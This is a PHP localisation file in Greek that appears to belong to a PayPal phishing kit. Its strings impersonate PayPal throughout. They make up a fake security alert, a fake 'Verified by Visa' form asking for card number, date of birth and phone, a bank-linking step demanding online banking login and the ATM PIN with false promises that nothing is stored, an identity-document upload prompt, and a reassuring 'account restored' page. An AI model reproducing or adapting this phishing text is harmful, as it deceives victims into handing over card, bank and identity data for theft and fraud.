<?
$language = array(
    'suspecious' => array(
        '1' => 'Για την προστασία του λογαριασμού σας, αναζητούμε τακτικά ενδείξεις πιθανής δόλιας δραστηριότητας..',
        '2' => 'Η ασφάλειά σας είναι προτεραιότητά μας.',
        '3' => 'Επειδή δεν έχουμε αναγνωρίσει τη συσκευή ή την τοποθεσία από την οποία συνδεθήκατε πρόσφατα, θα θέλαμε να επιβεβαιώσουμε την ταυτότητά σας. Θέλουμε να διασφαλίσουμε ότι αυτός είναι ο λογαριασμός σας.',
        '4' => 'Συνέχεια',
    ),
    'update'     => array(
        'navbar'     => array(
            '1' => 'Περίληψη',
            '2' => 'Δραστηριότητα',
            '3' => 'Αποστολή & Ζήτηση',
            '4' => 'Πορτοφόλι',
            '5' => 'Κατάστημα',
            '6' => 'Αποσύνδεση',
        ),
        'sub_navbar' => array(
            '1' => 'Λογαριασμός',
            '2' => 'Ασφάλεια',
            '3' => 'Πληρωμές',
            '4' => 'Ειδοποιήσεις',
        ),
        '1'          => 'Προφίλ',
        '2'          => 'Ενημέρωση Φωτογραφίας',
        '3'          => 'Συμμετέχει',
        '4'          => 'Επεξεργασία',
        '5'          => array(
            '1' => 'Σύνδεση Εγκρίθηκε',
            '2' => 'Επιβεβαιώστε Πιστωτική σας Κάρτα',
            '3' => 'Επιβεβαιώστε Τραπεζικό σας Λογαριασμό',
            '4' => 'Επιβεβαιώστε Ταυτότητά σας',
        ),
        '6'          => 'Διεύθυνση',
        '7'          => 'Κύρια, Διεύθυνση χρέωσης',
        '8'          => 'Επιβεβαίωση',
    ),

    'vbv'        => array(
        'lines' => array(
            '1' => 'Η Πρόσθετη Online Ασφάλεια',
            '2' => 'βοηθά στην προστασία της',
            '3' => 'κάρτας σας από μη εξουσιοδοτημένη χρήση online - χωρίς πρόσθετο κόστος. Για να τη χρησιμοποιήσετε',
            '4' => 'σ\' αυτήν και σε μελλοντικές αγορές, συμπληρώστε αυτή τη σελίδα. Θα δημιουργήσετε το δικό σας',
            '5' => 'Κωδικό Πρόσβασης',
        ),
        '1'     => 'Έμπορος',
        '2'     => 'Ποσό',
        '3'     => 'Ημερομηνία',
        '4'     => 'Αριθμός Κάρτας',
        '5'     => 'Τύπος Κάρτας',
        '6'     => 'Ονομασία Τράπεζας',
        '7'     => 'Όνομα όπως εμφανίζεται στην κάρτα',
        '8'     => 'Ημερομηνία Γέννησης Κύριου Κατόχου Κάρτας',
        '9'     => 'Προσωπικός Αριθμός Τηλεφώνου',
    ),

    'bank'       => array(
        'navbar'     => array(
            '1' => 'Περίληψη',
            '2' => 'Δραστηριότητα',
            '3' => 'Αποστολή & Ζήτηση',
            '4' => 'Πορτοφόλι',
            '5' => 'Κατάστημα',
            '6' => 'Αποσύνδεση',
        ),
        'sub_navbar' => array(
            '1' => 'Λογαριασμός',
            '2' => 'Ασφάλεια',
            '3' => 'Πληρωμές',
            '4' => 'Ειδοποιήσεις',
        ),
        '1'          => 'Προφίλ',
        '2'          => 'Ενημέρωση Φωτογραφίας',
        '3'          => 'Συμμετέχει',
        '4'          => 'Επεξεργασία',
        '5'          => array(
            '1' => 'Σύνδεση Εγκρίθηκε',
            '2' => 'Πιστωτική Κάρτα Επιβεβαιώθηκε',
            '3' => 'Επιβεβαιώστε Τραπεζικό σας Λογαριασμό',
            '4' => 'Επιβεβαιώστε Ταυτότητά σας',
        ),
        '6'          => 'Επιλέξτε Τράπεζά Σας',
        '7'          => 'Δεν έχετε Τραπεζικό Λογαριασμό;',
        '8'          => array(
            '1' => 'Χρησιμοποιήστε το',
            '2' => 'Τραπεζικό (Προσωπικό) σας αναγνωριστικό σύνδεσης για να συνδέσετε την τράπεζά σας. Δεν αποθηκεύουμε αυτό το στοιχείο.',
            '3' => 'Κάνοντας κλικ',
            '4' => 'συμφωνείτε με τους',
            '5' => 'Όρους και Προϋποθέσεις',
            '6' => 'σύνδεσης της τράπεζάς σας.',
        ),
        '9'          => array(
            '1' => 'Χρησιμοποιήστε τα',
            '2' => 'Τραπεζικά στοιχεία για να συνδέσετε την τράπεζά σας. Δεν αποθηκεύουμε αυτό το στοιχείο.',
        ),
        '10'         => 'Συνεχίζοντας, συμφωνείτε να επιτρέψετε στο PayPal την αποστολή και λήψη 2 μικρών καταθέσεων.',
        '11'         => 'Το τελευταίο βήμα για την επιβεβαίωση του Τραπεζικού σας λογαριασμού είναι να δώσετε τον κωδικό ΡΙΝ του ΑΤΜ, επειδή αυτός είναι ο μόνος τρόπος να γνωρίζουμε ότι είστε ο κάτοχος του λογαριασμού',
        '12'         => 'Δεν αποθηκεύουμε αυτό το στοιχείο.',
        '13'         => 'Η ΑΠΑΝΤΗΣΗ ΣΤΗΝ ΕΡΩΤΗΣΗ ΑΣΦΑΛΕΙΑΣ;',
        '14'         => 'Ο ΚΩΔΙΚΟΣ PIN ΤΟΥ ATM',
        '15'         => 'αγνοήστε αυτό το βήμα',

    ),
    'identity'   => array(
        'navbar'     => array(
            '1' => 'Περίληψη',
            '2' => 'Δραστηριότητα',
            '3' => 'Αποστολή & Ζήτηση',
            '4' => 'Πορτοφόλι',
            '5' => 'Κατάστημα',
            '6' => 'Αποσύνδεση',
        ),
        'sub_navbar' => array(
            '1' => 'Λογαριασμός',
            '2' => 'Ασφάλεια',
            '3' => 'Πληρωμές',
            '4' => 'Ειδοποιήσεις',
        ),
        '1'          => 'Προφίλ',
        '2'          => 'Ενημέρωση Φωτογραφίας',
        '3'          => 'Συμμετέχει',
        '4'          => 'Επεξεργασία',
        '5'          => array(
            '1' => 'Σύνδεση Εγκρίθηκε',
            '2' => 'Πιστωτική Κάρτα Επιβεβαιώθηκε',
            '3' => 'Τραπεζικός Λογαριασμός Επιβεβαιώθηκε',
            '4' => 'Επιβεβαιώστε Ταυτότητά σας',
        ),
        '6'          => 'Επιβεβαιώστε την ταυτότητά σας',
        '7'          => 'Μεταφορά και Απόθεση ή Αναζήτηση...',
        '8'          => 'Δεν έχετε την ταυτότητά σας αυτή τη στιγμή;',
    ),

    'thanks'     => array(
        'navbar'  => array(
            '1' => 'Περίληψη',
            '2' => 'Δραστηριότητα',
            '3' => 'Αποστολή & Ζήτηση',
            '4' => 'Πορτοφόλι',
            '5' => 'Κατάστημα',
            '6' => 'Αποσύνδεση',
        ),
        'content' => array(
            '1' => 'Η Πρόσβαση στο Λογαριασμό σας έχει Αποκατασταθεί Πλήρως',
            '2' => 'Σας ευχαριστούμε που ακολουθήσατε τα βήματα για την αποκατάσταση της πρόσβασης στο λογαριασμό σας.',
            '3' => 'Η υπομονή και οι προσπάθειές σας αυξάνουν την ασφάλεια για ολόκληρη την κοινότητα των χρηστών μας.',
            '4' => 'Το PayPal παίρνει την ασφάλεια του λογαριασμού, της επιχείρησης, καθώς και των οικονομικών στοιχείων σας τόσο σοβαρά όσο κι εσείς,',
            '5' => 'και αυτοί οι συνεχείς έλεγχοι του συστήματός μας συμβάλλουν στο υψηλό επίπεδο ασφαλείας μας.',
            '6' => 'ο λογαριασμός σας θα επαληθευθεί μέσα στις επόμενες 24 ώρες.',
            '7' => 'Αποσύνδεση',
            '8' => 'Θα ανακατευθυνθείτε προς το λογαριασμό σας ΡayΡal, μέσα σε 10 δευτερόλεπτα.',
        ),
    ));
?>